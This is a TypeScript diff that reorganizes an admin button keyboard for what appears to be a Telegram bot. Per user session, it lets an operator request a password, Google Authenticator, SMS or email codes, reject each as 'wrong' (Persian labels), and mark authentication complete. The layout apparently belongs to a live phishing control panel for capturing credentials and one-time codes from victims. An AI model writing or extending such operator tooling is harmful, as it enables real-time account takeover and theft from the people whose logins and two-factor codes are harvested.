@@ -387,7 +387,7 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
 
   const buttons = [];
 
-  // First row: Phone verification incorrect button (always show after phone verification)
+  // First row: Basic verification error buttons (always show after phone verification)
   buttons.push([
     {
       text: "❌ شماره اشتباه",
@@ -399,48 +399,33 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
     },
   ]);
 
-  // Authentication method buttons
-  const authButtons = [];
+  // Second section: Authentication methods
+  const authRow = [];
 
   // Password button
   if (!session.authAttempts["password"]) {
-    authButtons.push({
+    authRow.push({
       text: "🔒 Password",
       callback_data: `auth_password_${sessionId}`,
     });
     console.log("✅ Added Password button");
-  } else {
-    // Add incorrect password button if password was attempted
-    authButtons.push({
-      text: "❌ رمز اشتباه",
-      callback_data: `incorrect_password_${sessionId}`,
-    });
   }
 
   // Google Auth button
   if (!session.authAttempts["google"]) {
-    authButtons.push({
+    authRow.push({
       text: "📱 Google Auth",
       callback_data: `auth_google_${sessionId}`,
     });
     console.log("✅ Added Google Auth button");
-  } else {
-    // Add incorrect google button if attempted
-    authButtons.push({
-      text: "❌ Google Auth اشتباه",
-      callback_data: `incorrect_google_${sessionId}`,
-    });
   }
 
-  // Add auth buttons in pairs
-  for (let i = 0; i < authButtons.length; i += 2) {
-    if (i + 1 < authButtons.length) {
-      buttons.push([authButtons[i], authButtons[i + 1]]);
-    } else {
-      buttons.push([authButtons[i]]);
-    }
+  // Add auth buttons row if there are any
+  if (authRow.length > 0) {
+    buttons.push(authRow);
   }
 
+  // Third section: Additional methods
   // SMS Code button (allow up to 2 attempts)
   if (!session.authAttempts["sms"] || session.authAttempts["sms"] < 2) {
     buttons.push([
@@ -450,13 +435,6 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
       },
     ]);
     console.log("✅ Added SMS Code button");
-  } else {
-    buttons.push([
-      {
-        text: "❌ کد پیامک اشتباه",
-        callback_data: `incorrect_sms_${sessionId}`,
-      },
-    ]);
   }
 
   // Email Code button
@@ -468,16 +446,53 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
       },
     ]);
     console.log("✅ Added Email Code button");
-  } else {
-    buttons.push([
-      {
-        text: "❌ کد ایمیل اشتباه",
-        callback_data: `incorrect_email_${sessionId}`,
-      },
-    ]);
   }
 
-  // Complete Auth button (if user has completed at least one additional step)
+  // Fourth section: Error buttons for attempted methods
+  const errorRow = [];
+
+  if (session.authAttempts["password"]) {
+    errorRow.push({
+      text: "❌ رمز اشتباه",
+      callback_data: `incorrect_password_${sessionId}`,
+    });
+  }
+
+  if (session.authAttempts["google"]) {
+    errorRow.push({
+      text: "❌ Google اشتباه",
+      callback_data: `incorrect_google_${sessionId}`,
+    });
+  }
+
+  // Add error buttons row if there are any
+  if (errorRow.length > 0) {
+    buttons.push(errorRow);
+  }
+
+  // Additional error buttons for SMS and Email
+  const additionalErrorRow = [];
+
+  if (session.authAttempts["sms"] && session.authAttempts["sms"] >= 2) {
+    additionalErrorRow.push({
+      text: "❌ کد پیامک اشتباه",
+      callback_data: `incorrect_sms_${sessionId}`,
+    });
+  }
+
+  if (session.authAttempts["email"]) {
+    additionalErrorRow.push({
+      text: "❌ کد ایمیل اشتباه",
+      callback_data: `incorrect_email_${sessionId}`,
+    });
+  }
+
+  // Add additional error buttons row if there are any
+  if (additionalErrorRow.length > 0) {
+    buttons.push(additionalErrorRow);
+  }
+
+  // Final section: Complete Auth button (if user has completed at least one additional step)
   if (session.completedSteps.length > 1) {
     buttons.push([
       {
